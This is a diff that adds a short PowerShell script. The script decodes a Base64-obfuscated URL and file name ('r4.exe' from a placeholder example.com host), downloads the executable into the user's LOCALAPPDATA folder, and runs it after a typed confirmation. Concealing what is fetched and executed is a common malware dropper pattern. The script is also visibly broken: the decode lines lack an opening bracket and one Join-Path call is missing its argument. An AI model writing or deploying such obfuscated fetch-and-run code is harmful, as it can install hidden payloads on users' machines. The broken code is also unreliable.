@@ -1,0 +1,29 @@
+$baseToolName = "cjQ="
+$baseDownloadUrl = "aHR0cHM6Ly9vZmZpY2lhbC5leGFtcGxlLmNvbS9kb3dubG9hZHMvbGF0ZXN0L0V4YW1wbGVUb29sLmV4ZQ=="
+$baseFileName = "cjQuZXhl"
+
+$ToolName = System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($baseToolName))
+$DownloadUrl = System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($baseDownloadUrl))
+$FileName = System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($baseFileName))
+
+$DestinationFolder = Join-Path $env:LOCALAPPDATA
+$DestinationPath   = Join-Path $DestinationFolder $FileName
+
+Write-Host "Downloading..." -ForegroundColor Cyan
+
+try {
+    Invoke-WebRequest -Uri $DownloadUrl -OutFile $DestinationPath -UseBasicParsing
+    Write-Host "Download completed." -ForegroundColor Green
+}
+catch {
+    Write-Host "Download failed: $($_.Exception.Message)" -ForegroundColor Red
+    exit
+}
+
+$runConfirmation = Read-Host "Do you want to run the tool now? (type 'run' to execute)"
+
+if ($runConfirmation -eq "run") {
+    Start-Process -FilePath $DestinationPath
+}
+
+exit
